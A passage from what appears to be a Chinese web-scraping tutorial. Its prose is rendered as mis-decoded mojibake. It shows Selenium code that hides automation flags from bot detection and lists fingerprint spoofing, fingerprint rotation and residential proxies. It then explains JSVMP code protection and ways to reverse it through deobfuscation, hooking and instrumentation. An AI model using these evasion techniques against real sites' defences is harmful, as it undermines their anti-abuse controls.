<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">)</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;excludeSwitches&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;enable-automation&#39;</span><span class="p">])</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;useAutomationExtension&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>

<span class="c1"># ä¿®æ”¹ navigator.webdriver</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s1">&#39;Page.addScriptToEvaluateOnNewDocument&#39;</span><span class="p">,</span> <span class="p">{</span>
    <span class="s1">&#39;source&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">        Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s1">            get: () =&gt; undefined</span>
<span class="s1">        })</span>
<span class="s1">    &#39;&#39;&#39;</span>
<span class="p">})</span>

<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://target.com&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>æµè§ˆå™¨æŒ‡çº¹æ˜¯ç°ä»£åçˆ¬è™«çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ã€‚å¯¹æŠ—ç­–ç•¥ï¼š</p>

      <ol>
        <li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆPuppeteer/Seleniumï¼‰</li>
        <li>å®‰è£…åæŒ‡çº¹æ’ä»¶</li>
        <li>ä¼ªé€ æŒ‡çº¹ä¿¡æ¯</li>
        <li>ä½¿ç”¨æŒ‡çº¹æ± è½®æ¢</li>
        <li>é‡‡ç”¨ä½å®…ä»£ç†</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-canvas-fingerprinting">Canvas æŒ‡çº¹æŠ€æœ¯</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-javascript-vm-protection">
      <h2>35. JavaScript VM Protection</h2>
      <h1 id="javascript-è™šæ‹Ÿæœºä¿æŠ¤">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>JavaScript è™šæ‹Ÿæœºä¿æŠ¤ï¼ˆJSVMP, Virtual Machine based code Protection for JavaScriptï¼‰æ˜¯ä¸€ç§é«˜çº§çš„å‰ç«¯ä»£ç ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å°† JavaScript
        æºä»£ç è½¬æ¢ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œå¹¶ä½¿ç”¨ä¸“é—¨çš„è§£é‡Šå™¨æ‰§è¡Œï¼Œä»è€Œæœ‰æ•ˆéšè—åŸå§‹ä¸šåŠ¡é€»è¾‘ï¼Œå¢åŠ é€†å‘åˆ†æéš¾åº¦ã€‚</p>

      <p>JSVMP æ¦‚å¿µæœ€æ—©ç”±è¥¿åŒ—å¤§å­¦ 2015 çº§ç¡•å£«ç ”ç©¶ç”ŸåŒ¡å‡¯å…ƒåœ¨å…¶ 2018 å¹´çš„è®ºæ–‡ã€ŠåŸºäº WebAssembly çš„ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ³•ç ”ç©¶ä¸å®ç°ã€‹ä¸­æå‡ºã€‚</p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

      <p>JSVMPï¼ˆJavaScript Virtual Machine Protectionï¼‰æ˜¯ä¸€ç§ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ¡ˆã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯å°†ä»£ç è™šæ‹ŸåŒ–å¼•å…¥ JavaScript ä»£ç ä¿æŠ¤ä¸­ï¼Œå°†ç›®æ ‡ JS
        ä»£ç è½¬æ¢ä¸ºåªæœ‰ç‰¹æ®Šè§£é‡Šå™¨æ‰èƒ½è¯†åˆ«çš„è‡ªå®šä¹‰å­—èŠ‚ç ï¼Œéšè—ç›®æ ‡ä»£ç çš„å…³é”®é€»è¾‘ã€‚</p>

      <p>ä¸ä¼ ç»Ÿçš„æ··æ·†ã€åŠ å¯†ç­‰ä¿æŠ¤æ–¹å¼ä¸åŒï¼ŒJSVMP é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯ä»æ ¹æœ¬ä¸Šæ”¹å˜äº†ä»£ç çš„æ‰§è¡Œæ–¹å¼ã€‚</p>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <p>JSVMP çš„å·¥ä½œæµç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</p>

      <ol>
        <li><strong>è¯æ³•åˆ†æ â†’ è¯­æ³•åˆ†æ â†’ AST ç”Ÿæˆ</strong>ï¼šè§£æåŸå§‹ JavaScript ä»£ç ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘</li>
        <li><strong>ç§æœ‰æŒ‡ä»¤ç”Ÿæˆ</strong>ï¼šåŸºäº AST å®ç°ä¸åŒçš„è™šæ‹ŸåŒ–ç­–ç•¥ï¼Œå°†é«˜çº§è¯­æ³•æ‹†åˆ†ä¸ºå…·æœ‰åŸå­æ“ä½œç‰¹æ€§çš„ä¸­é—´ä»£ç </li>
        <li><strong>å­—èŠ‚ç ç¼–ç </strong>ï¼šå°†ä¸­é—´ä»£ç æ˜ å°„åˆ°è™šæ‹ŸæŒ‡ä»¤å¹¶ç¼–ç æˆå­—èŠ‚ç </li>
        <li><strong>ç§æœ‰è§£é‡Šå™¨ç”Ÿæˆ</strong>ï¼šç”Ÿæˆèƒ½å¤Ÿæ‰§è¡Œè‡ªå®šä¹‰å­—èŠ‚ç çš„è™šæ‹Ÿæœºè§£é‡Šå™¨</li>
      </ol>

      <p>æ•´ä¸ªè¿‡ç¨‹å°†åŸå§‹ä»£ç è½¬æ¢ä¸ºå¤±å»æ–‡æœ¬è¯­æ³•å±æ€§çš„å­—èŠ‚ç ï¼Œä½¿å¾—é€†å‘åˆ†æå˜å¾—æå…¶å›°éš¾ã€‚</p>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="è™šæ‹Ÿæœºæ¶æ„">è™šæ‹Ÿæœºæ¶æ„</h3>

      <p>JSVMP çš„ä¿æŠ¤ç»“æ„ä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>

      <pre><code>graph TB
    subgraph Source["åŸå§‹ JavaScript ä»£ç "]
        JS[JavaScript æºä»£ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;function encrypt(data) {&lt;br/&gt;  return hash(data);&lt;br/&gt;}]
    end

    subgraph Compiler["ç¼–è¯‘é˜¶æ®µï¼ˆç¦»çº¿ï¼‰"]
        Lexer[è¯æ³•åˆ†æå™¨&lt;br/&gt;Tokenizer]
        Parser[è¯­æ³•åˆ†æå™¨&lt;br/&gt;Parser]
        AST[æŠ½è±¡è¯­æ³•æ ‘&lt;br/&gt;AST]
        IRGen[ä¸­é—´ä»£ç ç”Ÿæˆ&lt;br/&gt;IR Generator]
        BytecodeGen[å­—èŠ‚ç ç”Ÿæˆ&lt;br/&gt;Bytecode Generator]

        JS --&gt; Lexer --&gt; Parser --&gt; AST
        AST --&gt; IRGen
        IRGen --&gt; BytecodeGen
    end

    subgraph Output["è¾“å‡ºäº§ç‰©"]
        Bytecode[è‡ªå®šä¹‰å­—èŠ‚ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;0x01 0x42 0x3A ...&lt;br/&gt;æ“ä½œç åºåˆ—]

        ConstPool[å¸¸é‡æ± &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ•°å­—å¸¸é‡&lt;br/&gt;â€¢ å­—ç¬¦ä¸²è¡¨&lt;br/&gt;â€¢ å‡½æ•°å¼•ç”¨]

        VMCode[VM è§£é‡Šå™¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ WebAssembly&lt;br/&gt;â€¢ æ··æ·†çš„ JS]
    end

    BytecodeGen --&gt; Bytecode
    BytecodeGen --&gt; ConstPool
    BytecodeGen --&gt; VMCode

    subgraph Runtime["è¿è¡Œæ—¶æ‰§è¡Œ"]
        VMInit[VM åˆå§‹åŒ–&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åˆ›å»ºä¸Šä¸‹æ–‡&lt;br/&gt;â€¢ åŠ è½½å­—èŠ‚ç &lt;br/&gt;â€¢ åˆå§‹åŒ–å¸¸é‡æ± ]

        VMContext[VM ä¸Šä¸‹æ–‡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è™šæ‹Ÿæ ˆ&lt;br/&gt;â€¢ å±€éƒ¨å˜é‡è¡¨&lt;br/&gt;â€¢ PC å¯„å­˜å™¨]

        Dispatcher[æŒ‡ä»¤åˆ†å‘å™¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è¯»å–æ“ä½œç &lt;br/&gt;â€¢ è·¯ç”±åˆ° Handler]

        Handlers[æŒ‡ä»¤å¤„ç†å™¨é›†åˆ&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Handler_PUSH&lt;br/&gt;â€¢ Handler_ADD&lt;br/&gt;â€¢ Handler_CALL&lt;br/&gt;â€¢ Handler_JMP&lt;br/&gt;â€¢ ...]

        VMExit[VM é€€å‡º&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è¿”å›ç»“æœ&lt;br/&gt;â€¢ æ¸…ç†èµ„æº]

        VMInit --&gt; VMContext
        VMContext --&gt; Dispatcher
        Dispatcher --&gt; Handlers
        Handlers --&gt; Dispatcher
        Dispatcher --&gt; VMExit
    end

    Bytecode -.åŠ è½½.-&gt; VMInit
    ConstPool -.åŠ è½½.-&gt; VMInit
    VMCode -.æ‰§è¡Œ.-&gt; Runtime

    style JS fill:#e1f5ff
    style Bytecode fill:#f5a623
    style VMCode fill:#bd10e0
    style Dispatcher fill:#4a90e2
</code></pre>

      <p><strong>æ¶æ„ç»„æˆéƒ¨åˆ†</strong>:</p>

      <ol>
        <li>
          <p><strong>è™šæ‹ŸæŒ‡ä»¤é›†ï¼ˆBytecodeï¼‰</strong></p>

          <ul>
            <li>è‡ªå®šä¹‰çš„æ“ä½œç é›†åˆ</li>
            <li>ç¼–ç åçš„æŒ‡ä»¤åºåˆ—</li>
            <li>å¸¸é‡æ± å’Œå­—ç¬¦ä¸²è¡¨</li>
          </ul>
        </li>
        <li>
          <p><strong>è™šæ‹Ÿè§£é‡Šå™¨ï¼ˆVM Interpreterï¼‰</strong></p>

          <ul>
            <li><strong>VMContext</strong>ï¼šè™šæ‹Ÿæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç»´æŠ¤æ‰§è¡ŒçŠ¶æ€</li>
            <li><strong>VMInit</strong>ï¼šåˆå§‹åŒ–æ¨¡å—ï¼Œè®¾ç½®è™šæ‹Ÿæœºç¯å¢ƒ</li>
            <li><strong>Dispatcher</strong>ï¼šè°ƒåº¦å™¨ï¼Œè´Ÿè´£æŒ‡ä»¤åˆ†å‘</li>
            <li><strong>Handler</strong>ï¼šå­—èŠ‚ç å¤„ç†å™¨ï¼Œæ‰§è¡Œå…·ä½“æŒ‡ä»¤</li>
            <li><strong>VMExit</strong>ï¼šé€€å‡ºæ¨¡å—ï¼Œæ¸…ç†è™šæ‹ŸæœºçŠ¶æ€</li>
          </ul>
        </li>
      </ol>

      <h3 id="åŸºäº-webassembly-çš„å®ç°">åŸºäº WebAssembly çš„å®ç°</h3>

      <p>ä¸ºäº†è¿›ä¸€æ­¥å¢å¼ºä¿æŠ¤å¼ºåº¦ï¼Œç°ä»£ JSVMP è§£é‡Šå™¨é€šå¸¸åŸºäº WebAssembly å®ç°ï¼š</p>

      <ul>
        <li>æ ¸å¿ƒé€»è¾‘ä½¿ç”¨ C/C++ ç¼–å†™</li>
        <li>é€šè¿‡ Emscripten æ¡†æ¶ç¼–è¯‘ä¸º WebAssembly äºŒè¿›åˆ¶æ ¼å¼</li>
        <li>åœ¨æµè§ˆå™¨ä¸­æ— æ³•ç›´æ¥è¯»å–æºä»£ç </li>
        <li>æ‰§è¡Œæ€§èƒ½ä¼˜äºçº¯ JavaScript å®ç°</li>
      </ul>

      <h3 id="ä»£ç è™šæ‹ŸåŒ–ç­–ç•¥">ä»£ç è™šæ‹ŸåŒ–ç­–ç•¥</h3>

      <p>é’ˆå¯¹ä¸åŒç±»å‹çš„ç›®æ ‡ä»£ç ï¼ŒJSVMP å®ç°äº†ä¸åŒçš„è™šæ‹ŸåŒ–ç­–ç•¥ï¼š</p>

      <ol>
        <li>
          <p><strong>æŒ‡ä»¤æ‹†åˆ†</strong></p>

          <ul>
            <li>å°† JavaScript ä»£ç è½¬æ¢ä¸ºå…·æœ‰åŸå­æ“ä½œç‰¹æ€§çš„ä¸­é—´ä»£ç </li>
            <li>æ¨¡æ‹Ÿæœ¬åœ°æ‰§è¡Œç¯å¢ƒ</li>
          </ul>
        </li>
        <li>
          <p><strong>è‡ªå®šä¹‰è™šæ‹ŸæŒ‡ä»¤é›†</strong></p>

          <ul>
            <li>å°†ä¸­é—´ä»£ç æ˜ å°„åˆ°è™šæ‹ŸæŒ‡ä»¤</li>
            <li>ç¼–ç ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç æ ¼å¼</li>
          </ul>
        </li>
        <li>
          <p><strong>å­—ç¬¦ä¸²å’Œå±æ€§æ›¿æ¢</strong></p>

          <ul>
            <li>å°†å±æ€§åå’Œå­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ•°ç»„å…ƒç´ ç´¢å¼•</li>
            <li>è¿›ä¸€æ­¥éšè—ä»£ç è¯­ä¹‰</li>
          </ul>
        </li>
      </ol>

      <h3 id="ç›¸æ¯”ä¼ ç»Ÿä¿æŠ¤çš„ä¼˜åŠ¿">ç›¸æ¯”ä¼ ç»Ÿä¿æŠ¤çš„ä¼˜åŠ¿</h3>

      <table>
        <thead>
          <tr>
            <th>ä¿æŠ¤æ–¹å¼</th>
            <th>å¯ç»•è¿‡æ€§</th>
            <th>å®‰å…¨æ€§</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ä»£ç æ··æ·†</td>
            <td>å¯é€šè¿‡ AST è¿˜åŸ</td>
            <td>ä½</td>
          </tr>
          <tr>
            <td>ä»£ç åŠ å¯†</td>
            <td>å¯é€šè¿‡ Hook è·å–è§£å¯†åä»£ç </td>
            <td>ä¸­</td>
          </tr>
          <tr>
            <td>åè°ƒè¯•</td>
            <td>å¯ç§»é™¤åè°ƒè¯•ä»£ç </td>
            <td>ä½</td>
          </tr>
          <tr>
            <td><strong>JSVMP</strong></td>
            <td><strong>ç§»é™¤è§£é‡Šå™¨ä¼šå¯¼è‡´åŠŸèƒ½å®Œå…¨ä¸§å¤±</strong></td>
            <td><strong>é«˜</strong></td>
          </tr>
        </tbody>
      </table>

      <p>JSVMP å°†ç›®æ ‡ä»£ç è½¬æ¢ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œç ´åäº†æ–‡æœ¬è¯­æ³•å±æ€§ï¼Œéšè—äº†å…³é”®é€»è¾‘ã€‚ä¸åè°ƒè¯•æˆ–åŠ å¯†ç­‰å¯ä»¥é€šè¿‡ç§»é™¤ä¿æŠ¤ç»“æ„æ¥ç»•è¿‡çš„æ–¹æ³•ä¸åŒï¼Œç§»é™¤ JSVMP è§£é‡Šå™¨ä¼šå¯¼è‡´åŸå§‹åŠŸèƒ½å®Œå…¨å¤±å»æ¢å¤èƒ½åŠ›ã€‚</p>

      <hr />

      <h2 id="jsvmp-é€†å‘åˆ†ææ–¹æ³•">JSVMP é€†å‘åˆ†ææ–¹æ³•</h2>

      <h3 id="ä¸‰ç§ä¸»è¦é€†å‘æ–¹æ³•2025">ä¸‰ç§ä¸»è¦é€†å‘æ–¹æ³•ï¼ˆ2025ï¼‰</h3>

      <p>ç›®å‰é’ˆå¯¹ JSVMP çš„é€†å‘ä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>

      <ol>
        <li>
          <p><strong>RPC è¿œç¨‹è°ƒç”¨</strong></p>

          <ul>
            <li>åœ¨çœŸå®æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œ JSVMP ä¿æŠ¤çš„å‡½æ•°</li>
            <li>é€šè¿‡ç½‘ç»œæ¥å£æš´éœ²åŠŸèƒ½</li>
            <li>ä¼˜ç‚¹ï¼šå®ç°ç®€å•ï¼Œç¨³å®šæ€§é«˜</li>
            <li>ç¼ºç‚¹ï¼šéœ€è¦ç»´æŠ¤æµè§ˆå™¨ç¯å¢ƒï¼Œæ€§èƒ½å¼€é”€å¤§</li>
          </ul>
        </li>
        <li>
          <p><strong>ç¯å¢ƒè¡¥å……ï¼ˆè¡¥ç¯å¢ƒï¼‰</strong></p>

          <ul>
            <li>åœ¨ Node.js ä¸­æ¨¡æ‹Ÿæµè§ˆå™¨ç¯å¢ƒ</li>
            <li>è¡¥å……ç¼ºå¤±çš„ DOMã€BOM API</li>
            <li>ä¼˜ç‚¹ï¼šæ‰§è¡Œæ•ˆç‡é«˜</li>
            <li>ç¼ºç‚¹ï¼šéœ€è¦å¤§é‡ç¯å¢ƒé€‚é…å·¥ä½œ</li>
          </ul>
        </li>
        <li>
          <p><strong>æ’æ¡©è¿˜åŸç®—æ³•</strong></p>

          <ul>
            <li>é€šè¿‡æ—¥å¿—è¾“å‡ºå…³é”®å‚æ•°</li>
            <li>ä»ç»“æœåæ¨ç”Ÿæˆé€»è¾‘</li>
            <li>å®ç°çº¯ç®—æ³•è¿˜åŸ</li>
            <li>ä¼˜ç‚¹ï¼šä¸ä¾èµ–åŸå§‹ä»£ç ï¼Œå¯ç§»æ¤æ€§å¼º</li>
            <li>ç¼ºç‚¹ï¼šå·¥ä½œé‡å¤§ï¼Œéœ€è¦æ·±å…¥ç†è§£ç®—æ³•</li>
          </ul>
        </li>
      </ol>

      <h3 id="å…³é”®è°ƒè¯•æŠ€å·§">å…³é”®è°ƒè¯•æŠ€å·§</h3>

      <h4 id="1-ast-åæ··æ·†">1. AST åæ··æ·†</h4>

      <p>ä½¿ç”¨å·¥å…·å¯¹æ··æ·†ä»£ç è¿›è¡Œè¿˜åŸï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ v_jstools æ’ä»¶è¿›è¡Œ AST åæ··æ·†</span>
<span class="c1">// å®‰è£…ï¼šnpm install v_jstools</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/parser&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/traverse&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/generator&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;fs&quot;</span><span class="p">);</span>

<span class="c1">// è¯»å–æ··æ·†ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&quot;obfuscated.js&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf-8&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// è¿›è¡Œ AST è½¬æ¢</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ·»åŠ åæ··æ·†è§„åˆ™</span>
<span class="p">});</span>

<span class="c1">// ç”Ÿæˆè¿˜åŸåçš„ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">).</span><span class="nx">code</span><span class="p">;</span>
<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s2">&quot;deobfuscated.js&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="2-æ’æ¡©æ—¥å¿—è®°å½•">2. æ’æ¡©/æ—¥å¿—è®°å½•</h4>

      <p>åœ¨å…³é”®ä½ç½®æ’å…¥æ—¥å¿—ï¼Œè¾“å‡ºå…³é”®å‚æ•°ä¿¡æ¯ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ JSVMP è§£é‡Šå™¨ä»£ç ï¼ˆç¤ºä¾‹ï¼‰</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">vmExecute</span><span class="p">(</span><span class="nx">bytecode</span><span class="p">,</span><span class="w"> </span><span class="nx">context</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ’æ¡©ï¼šè®°å½•å­—èŠ‚ç æ‰§è¡Œè¿‡ç¨‹</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Executing bytecode:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Context:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">context</span><span class="p">));</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">pc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">opcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">[</span><span class="nx">pc</span><span class="p">];</span>

<span class="w">        </span><span class="c1">// æ’æ¡©ï¼šè®°å½•æ¯æ¡æŒ‡ä»¤</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`PC: </span><span class="si">${</span><span class="nx">pc</span><span class="si">}</span><span class="sb">, Opcode: </span><span class="si">${</span><span class="nx">opcode</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">opcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="nx">OP_LOAD</span><span class="o">:</span>
<span class="w">                </span><span class="c1">// æ’æ¡©ï¼šè®°å½•åŠ è½½æ“ä½œ</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;LOAD operation:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">[</span><span class="nx">pc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">]);</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="c1">// ... å…¶ä»–æŒ‡ä»¤</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">pc</span><span class="o">++</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-æµè§ˆå™¨æ›¿æ¢å‡½æ•°">3. æµè§ˆå™¨æ›¿æ¢å‡½æ•°</h4>

      <p>ä½¿ç”¨æµè§ˆå™¨çš„èµ„æºè¦†ç›–åŠŸèƒ½è°ƒè¯•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Chrome DevTools ä¸­ä½¿ç”¨ Overrides åŠŸèƒ½</span>
<span class="c1">// 1. æ‰“å¼€ DevTools â†’ Sources â†’ Overrides</span>
<span class="c1">// 2. é€‰æ‹©æœ¬åœ°æ–‡ä»¶å¤¹</span>
<span class="c1">// 3. ä¿®æ”¹ JS æ–‡ä»¶å¹¶ä¿å­˜</span>
<span class="c1">// 4. åˆ·æ–°é¡µé¢æµ‹è¯•ä¿®æ”¹åçš„ä»£ç </span>

<span class="c1">// ç¤ºä¾‹ï¼šHook JSVMP è§£é‡Šå™¨</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalVMExecute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">vmExecute</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">vmExecute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;VM Execute called with:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalVMExecute</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;VM Execute result:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="4-åŠ¨æ€åˆ†æ">4. åŠ¨æ€åˆ†æ</h4>

      <p>ä½¿ç”¨è°ƒè¯•å™¨æ•è·è¿è¡Œæ—¶æŒ‡ä»¤æµï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨å…³é”®ä½ç½®è®¾ç½®æ–­ç‚¹</span>
<span class="c1">// ä½¿ç”¨ Chrome DevTools çš„æ¡ä»¶æ–­ç‚¹åŠŸèƒ½</span>

<span class="c1">// æ¡ä»¶æ–­ç‚¹ç¤ºä¾‹ï¼š</span>
<span class="c1">// å½“æŸä¸ªå˜é‡ç­‰äºç‰¹å®šå€¼æ—¶æš‚åœ</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">register</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mh">0x1234</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// è®°å½•æ‰§è¡Œè·¯å¾„</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">executionTrace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">traceExecution</span><span class="p">(</span><span class="nx">pc</span><span class="p">,</span><span class="w"> </span><span class="nx">opcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
